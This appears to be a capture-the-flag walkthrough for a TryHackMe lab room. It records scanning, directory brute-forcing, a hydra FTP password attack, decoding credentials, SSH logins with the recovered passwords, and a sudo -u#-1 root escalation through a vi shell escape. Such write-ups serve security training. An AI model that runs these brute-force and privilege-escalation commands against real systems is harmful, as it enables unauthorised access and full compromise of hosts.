# Year of the Rabbit

**Room Link:** [https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### Turn off Javascript

```
Enter about:config into the search bar and select Accept the Risk and Continue.
Enter javascript.enabled into the search box at the top of the page.
Select the javascript.enabled toggle to change the value to false.
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
strings Hot_Babe.png 
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l ftpuser -P passwords.txt ftp://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

## FTP

**Kali**

```
ftp $VICTIM
password: 5iez1wGXKfPKQ
```

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Elis creds is encoded with something called Brain fuck. There are tools online to decode it.

**Link:** [https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language)

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh eli@$VICTIM
Password: DSpDiM1wAEwid
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
locate s3cr3t
cat cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
```

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su gwendoline
Password: MniVCQVhQHUNI
```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## **Privilege escalation**

Mostly followed the link below, we can't run sudo with root as we have (ALL , !root) here. if we had (ALL , ALL) it would be easy to escalate. Adding sudo -u#-1  to infront of the command allows us to bypass this.

**Link:** [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

**Victim**

```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
#While vi is open run:
:!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>























